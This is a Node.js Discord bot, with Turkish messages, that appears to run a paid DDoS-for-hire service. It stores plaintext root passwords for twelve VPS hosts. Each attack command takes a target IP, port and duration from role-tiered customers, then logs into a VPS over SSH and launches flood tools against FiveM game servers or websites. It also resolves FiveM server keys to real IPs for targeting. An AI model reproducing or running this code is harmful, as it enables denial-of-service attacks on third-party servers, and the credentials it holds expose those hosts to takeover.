const Discord = require('discord.js');
const client = new Discord.Client();
const SSH = require('simple-ssh');
const config = require('./cfg.json');
require('dotenv').config();
const { TOKEN, Prefix } = process.env;
const axios = require('axios');

const vpsler = [
    {
        host: '185.93.69.195',
        user: 'root',
        pass: '221198AsAs',
        isBusy: false,
    },
    {
        host: '193.36.63.125',
        user: 'root',
        pass: '221198AsAs',
        isBusy: false,
    },
    {
        host: '193.36.63.126',
        user: 'root',
        pass: '221198AsAs',
        isBusy: false,
    },
    {
        host: '45.90.162.110',
        user: 'root',
        pass: '221198AsAs' ,
        isBusy: false,
   },
   {
        host: '45.90.162.186',
        user: 'root',
        pass: '221198AsAs' ,
        isBusy: false,
    },
        {       
        host: '45.90.162.189',
        user: 'root',
        pass: '221198AsAs' ,
        isBusy: false,
       },
       {       
        host: '45.90.162.57',
        user: 'root',
        pass: '221198AsAs' ,
        isBusy: false,
       },
       {       
        host: '80.253.246.112',
        user: 'root',
        pass: '221198AsAs' ,
        isBusy: false,
       },
       {       
        host: '91.151.88.9',
        user: 'root',
        pass: '221198AsAs' ,
        isBusy: false,
       },
       {       
        host: '91.151.89.70',
        user: 'root',
        pass: '221198AsAs' ,
        isBusy: false,
       },
       {       
        host: '45.90.162.82',
        user: 'root',
        pass: '221198AsAs' ,
        isBusy: false,
       },
       {       
        host: '45.90.162.135',
        user: 'root',
        pass: '221198AsAs' ,
        isBusy: false,
       },
]

const egemenID = '802901032954101770';
const mutiID = '530470489831768065';
const ownerRolID = '819338861775683625';
const logChannelID = '820505145313198092';
const nodejsChannelID = '820505801990995999';
const customerID = '819339356312829952';

const roller = {
    "1": {
        name: '"Basicuser"',
        id: "819382664557232148",
        perms: ['t'],
        timeLimit: 30
    },
    "2": {
        name: ' "Vipuser"',
        id: "819339293566828554",
        perms: ['t'],
        timeLimit: 120
    },
    "3": {
        name: ' "Fsxuserfull"',
        id: "819339156441268255",
        perms: ['t'],
        timeLimit: 280
    }
}

client.on('ready', () => {
    console.log(`${client.user.tag} olarak giriş yapıldı!`);
});

const stdoutFunction = (stdout) => {
    console.log('Geri gelen yanıt', stdout);
}
const hataMesaji = (title = 'HATA!', description) => {
    return new Discord.MessageEmbed()
            .setTitle('HATA!')
            .setColor('#0099ff')
            .addField(title, description, true)
            .setFooter('~ SX Panel Bot ~');
}
const bilgiMesaji = (title = 'BİLGİ!', description) => {
    return new Discord.MessageEmbed()
            .setTitle('BİLGİ')
            .setColor('#0099ff')
            .addField(title, description, true)
            .setFooter('~ SX Panel Bot ~');
}

var number = 1;

client.on('message', async (msg) => {
    if (msg.author.bot) return;
    var memberRole = 0;

    msg.member.roles.cache.forEach(element => {
        if(element.id == roller["1"].id && memberRole <= 1){
            memberRole = 1;
        } 
        if(element.id == roller["2"].id && memberRole <= 2){
            memberRole = 2;
        } 
        if(element.id == roller["3"].id && memberRole <= 3){
            memberRole = 3;
        } 
    });

    if (msg.content === `${Prefix}yardım`) {
        msg.channel.send(
            new Discord.MessageEmbed()
                .setColor('#0099ff')
                .setTitle(msg.author.username)
                .setURL('https://cdn.discordapp.com/attachments/740715399653490788/812058314426679356/Baslksz-1.png')
                .setAuthor('SX Panel', 'https://cdn.discordapp.com/attachments/740715399653490788/812058314426679356/Baslksz-1.png', 'https://discord.js.org')
                .setDescription('Panel komutlarını sana şu şekilde açıklayabilirim.')
                .setThumbnail('https://cdn.discordapp.com/attachments/740715399653490788/812058314426679356/Baslksz-1.png')
                .addFields(
                    { name: 'Sadece Basic Üyeler İçin!', value: '!basic [IP] [PORT] [SÜRE]' },
                    { name: 'Sadece Vip Üyeler İçin!', value: '!eufivem [IP] [PORT] [SÜRE]' },
                    { name: 'Sadece Vip Üyeler İçin!', value: '!fivemsex [IP] [PORT] [SÜRE]' },
                    { name: 'Sadece Vip Üyeler İçin!', value: '!kernal [IP] [PORT] [SÜRE]' },
                    { name: 'Sadece Fsx Üyeler İçin!', value: '!down [WEBSITE_URL]' },
                    { name: '\u200B', value: '\u200B' },
                    { name: 'Basic Yetkiniz', value: memberRole >= 1 ? 'Var' : 'Yok', inline: true },
                    { name: 'custommer Yetkiniz', value: memberRole >= 2 ? 'Var' : 'Yok', inline: true },
                    { name: 'FSX Yetkiniz', value: memberRole >= 3 ? 'Var' : 'Yok', inline: true },
                )
                .addField('Satın Almak İçin', `<@${egemenID}> ve <@${mutiID}>`, true)
                .setImage(`https://cdn.discordapp.com/avatars/${msg.author.id}/${msg.author.avatar}.jpeg`)
                .setTimestamp()
                .setFooter('~ SX Panel Bot ~', 'https://cdn.discordapp.com/attachments/740715399653490788/812058314426679356/Baslksz-1.png')
        )
        .then( (message) => message.delete({ timeout: 10000 }));
        return msg.delete();
    }
    
    if (msg.content.includes(`${Prefix}reset`)) {
        if (!msg.member.roles.cache.has(ownerRolID)) {
            msg.channel.send(hataMesaji('Yetersiz Yetki', `<@${msg.author.id}>, Owner yetkiniz yok!`))
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        let logText = `[RESET] : [${msg.author.username}]`;
        client.channels.cache.get(logChannelID).send(logText);
        console.log(logText);
        msg.channel.send(bilgiMesaji('Otomatik Mesaj', `Makineler yenileniyor, bu bir rutin işlemdir...`))
            .then( (message) => message.delete({ timeout: 10000 }));
        msg.delete();
        
        var ssh = null;
        for (vps of vpsler) {
            vpsler.isBusy = false;
            ssh = new SSH(vps);
            ssh.exec(`reboot`, {
                out: stdoutFunction,
                err: function (stderr) { console.log('STDERR: ', stderr); },
            }).start();
        }
        return;
    }
    
    if (msg.content.includes(`${Prefix}ip`)) {
        if (msg.author.bot) return;
        let key = msg.content.split(' ')[1];
        if (msg.channel.id !== nodejsChannelID) {
            msg.channel.send(`<@${msg.author.id}>, Botumuzun ip-checker özelliğini sadece <#${nodejsChannelID}> kanalında kullanabilirsin!`)
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        if (!msg.member.roles.cache.has(customerID)) {
            msg.channel.send(hataMesaji('Yetersiz Yetki', `<@${msg.author.id}>, Customer yetkiniz yok!`))
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        if (key == null) {
            msg.channel.send(hataMesaji('HATA!', `<@${msg.author.id}>, anahtar kelime girmediniz!`))
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        axios.get(`https://servers-live.fivem.net/api/servers/single/${key}`)
            .then( (response) => {
                let logText = `[IPCHECK] : [${msg.author.username}] ${key}`;
                client.channels.cache.get(logChannelID).send(logText);
                console.log(logText);
                
                msg.channel.send(bilgiMesaji('İp Bulundu!', `<@${msg.author.id}>, IP Adresi: ${response.data.Data.connectEndPoints[0]}`))
                    .then( (message) => message.delete({ timeout: 15000 }));
                msg.delete();
                return;
            })
            .catch((error) => {
                msg.channel.send(hataMesaji('İstek Hatası!', 'İstek zaman aşımına uğradı, tekrar deneyin!'))
                    .then( (message) => message.delete({ timeout: 5000 }));
                msg.delete();
                return;
            });
    }

    if (msg.content.includes(`${Prefix}basic`)) {
        if (msg.channel.id !== nodejsChannelID) {
            msg.channel.send(`<@${msg.author.id}>, Botumuzu sadece <#${nodejsChannelID}> kanalında kullanabilirsin!`)
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        if (memberRole < 1) {
            msg.channel.send(hataMesaji('Yetersiz Yetki', `<@${msg.author.id}>, Basic yetkiniz yok!`))
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        let ip, port, time;
        ip = msg.content.split(' ')[1];
        port = msg.content.split(' ')[2];
        time = msg.content.split(' ')[3];

        if (time == null) {
            msg.channel.send(hataMesaji('Eksik Bilgi!', `<@${msg.author.id}>, zamanı girmeyi unuttun!`))
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        if (ip == null || port == null || time == null) {
            msg.channel.send(hataMesaji('Eksik Bilgi!', `<@${msg.author.id}>, Lütfen bilgileri tekrar kontrol ediniz.`))
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        if (time > roller[memberRole].timeLimit) {
            msg.channel.send(hataMesaji('Yetki Dışı Kullanım', `<@${msg.author.id}>, Zaman değerini en fazla ${roller[memberRole].timeLimit} girebilir veya geçerli planını yükseltebilirsin.`))
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        let saldiriSaniyesi = time * 10;
        var ssh = null;
        for (vps of vpsler) {
            if (vps.isBusy) {
                ssh == null;
            } else {
                ssh = new SSH(vps);
                let logText = `[BASIC] : [${msg.author.username}] ${vps.host}:22 -> ${ip}:${port}`;
                client.channels.cache.get(logChannelID).send(logText);
                console.log(logText);
                vps.isBusy = true;
                setTimeout( () => {
                    vps.isBusy = false
                }, time * 1000);
                break;
            }
        }
        if (ssh == null) {
            msg.channel.send(`<@${msg.author.id}>, Makinelerimiz şuanda meşgul, lütfen sonra tekrar deneyiniz.`)
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        ssh.exec(`./t ${ip} ${port} 999 ${saldiriSaniyesi}`, {
            out: stdoutFunction,
            err: function (stderr) { console.log('STDERR: ', stderr); },
            exit: function (code) { /* msg.channel.send(code); */ }
        }).start();
        if (port === '30120') {
            msg.channel.send(bilgiMesaji('Fivem Sunucu Saldırısı Başladı', `${time} saniye boyunca sürecek eğlenceniz başladı.\nSaldırıyı buradan takip edebilirsiniz : http://${ip}:${port}/players.json`))
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        } else {
            msg.channel.send(bilgiMesaji('Eğlence Başladı', `<@${msg.author.id}>, ${time} saniye boyunca sürecek eğlenceniz başladı. QueXFLY iyi uçuşlar diler.`))
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
    }

    if (msg.content.includes(`${Prefix}eufivem`)) {
        if (msg.channel.id !== nodejsChannelID) {
            msg.channel.send(`<@${msg.author.id}>, Botumuzu sadece <#${nodejsChannelID}> kanalında kullanabilirsin!`)
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        if (memberRole < 2) {
            msg.channel.send(hataMesaji('Yetersiz Yetki', `<@${msg.author.id}>, Vip yetkiniz yok!`))
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        let ip, port, time;
        ip = msg.content.split(' ')[1];
        port = msg.content.split(' ')[2];
        time = msg.content.split(' ')[3];
        
        if (time == null) {
            msg.channel.send(hataMesaji('Eksik Bilgi!', `<@${msg.author.id}>, zamanı girmeyi unuttun!`))
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        if (time > roller[memberRole].timeLimit) {
            msg.channel.send(hataMesaji('Yetki Dışı Kullanım', `Zaman değerini en fazla ${roller[memberRole].timeLimit} girebilir veya geçerli planını yükseltebilirsin.`))
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        let saldiriSaniyesi = time * 10;
        var ssh = null;
        for (vps of vpsler) {
            if (vps.isBusy) {
                ssh == null;
            } else {
                ssh = new SSH(vps);
                let logText = `[EUFIVEM] : [${msg.author.username}] ${vps.host}:22 -> ${ip}:${port}`;
                client.channels.cache.get(logChannelID).send(logText);
                console.log(logText);
                vps.isBusy = true;
                setTimeout( () => {
                    vps.isBusy = false
                }, time * 1000);
                break;
            }
        }
        if (ssh == null) {
            msg.channel.send('Makinelerimiz şuanda meşgul, lütfen sonra tekrar deneyiniz.')
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        ssh.exec(`./eufivem ${ip} ${port} 999 ${saldiriSaniyesi}`, {
            out: stdoutFunction,
            err: function (stderr) { console.log('STDERR: ', stderr); },
            exit: function (code) { /* msg.channel.send(code); */ }
        }).start();
        msg.channel.send(bilgiMesaji('Eğlence Başladı', `<@${msg.author.id}>, ${time} saniye boyunca sürecek eğlenceniz başladı.`))
            .then( (message) => message.delete({ timeout: 5000 }));
        msg.delete();
        return;
    }

    if (msg.content.includes(`${Prefix}fivemsex`)) {
        if (msg.channel.id !== nodejsChannelID) {
            msg.channel.send(`<@${msg.author.id}>, Botumuzu sadece <#${nodejsChannelID}> kanalında kullanabilirsin!`)
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        console.log(memberRole);
        if (memberRole < 2) {
            msg.channel.send(hataMesaji('Yetersiz Yetki', `<@${msg.author.id}>, Vip yetkiniz yok!`))
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        let ip, port, time;
        ip = msg.content.split(' ')[1];
        port = msg.content.split(' ')[2];
        time = msg.content.split(' ')[3];

        if (time == null) {
            msg.channel.send(hataMesaji('Eksik Bilgi!', `<@${msg.author.id}>, zamanı girmeyi unuttun!`))
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        if (time > roller[memberRole].timeLimit) {
            msg.channel.send(hataMesaji('Yetki Dışı Kullanım', `Zaman değerini en fazla ${roller[memberRole].timeLimit} girebilir veya geçerli planını yükseltebilirsin.`))
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        let saldiriSaniyesi = time * 10;
        var ssh = null;
        for (vps of vpsler) {
            if (vps.isBusy) {
                ssh == null;
            } else {
                ssh = new SSH(vps);
                let logText = `[FIVEMSEX] : [${msg.author.username}] ${vps.host}:22 -> ${ip}:${port}`;
                client.channels.cache.get(logChannelID).send(logText);
                vps.isBusy = true;
                setTimeout( () => {
                    vps.isBusy = false
                }, time * 1000);
                break;
            }
        }
        if (ssh == null) {
            msg.channel.send('Makinelerimiz şuanda meşgul, lütfen sonra tekrar deneyiniz.')
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        ssh.exec(`./fivemsex ${ip} ${port} 999 ${saldiriSaniyesi}`, {
            out: stdoutFunction,
            err: function (stderr) { console.log('STDERR: ', stderr); },
            exit: function (code) { /* msg.channel.send(code); */ }
        }).start();
        msg.channel.send(bilgiMesaji('Eğlence Başladı', `<@${msg.author.id}>, ${time} saniye boyunca sürecek eğlenceniz başladı.`))
            .then( (message) => message.delete({ timeout: 5000 }));
        msg.delete();
        return;
    }

    if (msg.content.includes(`${Prefix}kernal`)) {
        if (msg.channel.id !== nodejsChannelID) {
            msg.channel.send(`<@${msg.author.id}>, Botumuzu sadece <#${nodejsChannelID}> kanalında kullanabilirsin!`)
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        if (memberRole < 2) {
            msg.channel.send(hataMesaji('Yetersiz Yetki', `<@${msg.author.id}>, custommer yetkiniz yok!`))
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        let ip, port, time;
        ip = msg.content.split(' ')[1];
        port = msg.content.split(' ')[2];
        time = msg.content.split(' ')[3];

        if (time == null) {
            msg.channel.send(hataMesaji('Eksik Bilgi!', `<@${msg.author.id}>, zamanı girmeyi unuttun!`))
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        if (time > roller[memberRole].timeLimit) {
            msg.channel.send(hataMesaji('Yetki Dışı Kullanım', `Zaman değerini en fazla ${roller[memberRole].timeLimit} girebilir veya geçerli planını yükseltebilirsin.`))
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        let saldiriSaniyesi = time * 10;
        var ssh = null;
        for (vps of vpsler) {
            if (vps.isBusy) {
                ssh == null;
            } else {
                ssh = new SSH(vps);
                let logText = `[KERNAL] : [${msg.author.username}] ${vps.host}:22 -> ${ip}:${port}`;
                client.channels.cache.get(logChannelID).send(logText);
                console.log(logText);
                vps.isBusy = true;
                setTimeout( () => {
                    vps.isBusy = false
                }, time * 1000);
                break;
            }
        }
        if (ssh == null) {
            msg.channel.send('Makinelerimiz şuanda meşgul, lütfen sonra tekrar deneyiniz.')
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        ssh.exec(`./kernal ${ip} ${port} 999 ${saldiriSaniyesi}`, {
            out: stdoutFunction,
            err: function (stderr) { console.log('STDERR: ', stderr); },
            exit: function (code) { /* msg.channel.send(code); */ }
        }).start();
        msg.channel.send(bilgiMesaji('Eğlence Başladı', `<@${msg.author.id}>, ${time} saniye boyunca sürecek eğlenceniz başladı.`))
            .then( (message) => message.delete({ timeout: 5000 }));
        msg.delete();
        return;
    }

    if (msg.content.includes(`${Prefix}down`)) {
        let website_url;
        website_url = msg.content.split(' ')[1];
        if (website_url == null || !website_url.includes('http')) {
            msg.channel.send(hataMesaji('Eksik Bilgi', 'Saldıracağın website\'nin bağlantısını yazmayı unuttun!'))
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        if (msg.channel.id !== nodejsChannelID) {
            msg.channel.send(`<@${msg.author.id}>, Botumuzu sadece <#${nodejsChannelID}> kanalında kullanabilirsin!`)
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        if (memberRole < 3) {
            msg.channel.send(hataMesaji('Yetersiz Yetki', `<@${msg.author.id}>, Fsx yetkiniz yok!`))
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        var ssh = null;
        for (vps of vpsler) {
            if (vps.isBusy) {
                ssh == null;
            } else {
                ssh = new SSH(vps);
                let logText = `[DOWN] : [${msg.author.username}] ${vps.host}:22 -> ${website_url}`;
                client.channels.cache.get(logChannelID).send(logText);
                console.log(logText);
                vps.isBusy = true;
                setTimeout( () => {
                    vps.isBusy = false
                },  30 * 1000);
                break;
            }
        }
        if (ssh == null) {
            msg.channel.send('Makinelerimiz şuanda meşgul, lütfen sonra tekrar deneyiniz.')
                .then( (message) => message.delete({ timeout: 5000 }));
            msg.delete();
            return;
        }
        ssh.exec(`python quexbugs.py ${website_url}`, {
            out: stdoutFunction,
            err: function (stderr) { console.log('STDERR: ', stderr); },
            exit: function (code) { /* msg.channel.send(code); */ }
        }).start();
        msg.channel.send(bilgiMesaji('Eğlence Başladı', `<@${msg.author.id}>, 30 saniye boyunca sürecek eğlenceniz başladı.`))
            .then( (message) => message.delete({ timeout: 5000 }));
        msg.delete();
        return;
    }
});

client.login(TOKEN);